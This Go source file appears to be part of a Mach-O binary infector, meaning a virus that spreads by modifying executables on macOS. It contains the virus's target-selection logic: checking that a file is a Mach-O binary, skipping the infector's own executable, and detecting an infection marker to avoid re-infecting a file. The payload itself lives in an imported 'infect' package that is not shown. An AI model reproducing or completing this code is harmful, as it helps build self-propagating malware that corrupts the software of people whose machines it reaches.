package main

import (
	"bytes"
	"debug/macho"
	"io/ioutil"
	"os"
	"path/filepath"

	"./infect"
)

// canInfect will check if a binary can be infected and fails siletly on
// failures
func canInfect(path string) bool {
	return !isInfected(path) && notInfectBin(path)
}

// notInfectBin makes sure that the binary being run is not the initial infection
// binary
func notInfectBin(path string) bool {
	absCurrPath, _ := filepath.Abs(os.Args[0])
	if path == absCurrPath {
		return false
	}

	return true
}

// isMacho returns if the binary is a Macho-O binary
func isMacho(path string) bool {
	_, err := macho.Open(path)
	if err != nil {
		return false
	}
	return true
}

// isInfected returns if the binary has the infection mark (infect.InfectMark)
func isInfected(path string) bool {
	file, err := ioutil.ReadFile(path)
	if err != nil {
		return true
	}

	if bytes.Contains(file, infect.InfectMark) {
		return true
	}
	return false
}
